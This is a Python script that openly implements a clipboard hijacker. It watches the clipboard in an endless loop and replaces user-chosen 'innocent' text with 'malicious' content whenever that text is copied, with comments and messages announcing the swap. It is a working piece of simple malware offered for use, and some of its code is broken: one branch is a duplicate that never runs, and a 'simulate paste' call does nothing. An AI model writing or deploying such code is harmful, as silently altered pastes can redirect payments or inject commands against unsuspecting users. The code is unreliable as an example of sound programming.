import pyperclip

def main():
    # Step 1: Input innocent and malicious texts
    innocent_text = input("Enter the innocent text you want to display: ")
    malicious_text = input("Enter the malicious content you want to paste: ")

    # Step 2: Copy malicious text to clipboard
    pyperclip.copy(malicious_text)
    print("Malicious content has been copied to the clipboard. When you paste, you'll get something unexpected!")

    # Step 3: Continuously monitor clipboard and replace innocent text with malicious text
    while True:
        # Check if innocent text is in clipboard data
        clipboard_data = pyperclip.paste()
        if innocent_text in clipboard_data:
            # Replace innocent text with malicious text
            modified_data = clipboard_data.replace(innocent_text, malicious_text)
            # Paste modified data
            pyperclip.copy(modified_data)
            pyperclip.paste()  # Simulate paste action
            print("Innocent text replaced with malicious text!")
            print("Innocent text: ", innocent_text)

        # Check if innocent text is copied to clipboard
        elif innocent_text in pyperclip.paste():
            # Replace innocent text with malicious text
            modified_data = pyperclip.paste().replace(innocent_text, malicious_text)
            # Copy modified data to clipboard
            pyperclip.copy(modified_data)
            print("Innocent text replaced with malicious text!")

if __name__ == "__main__":
    main()
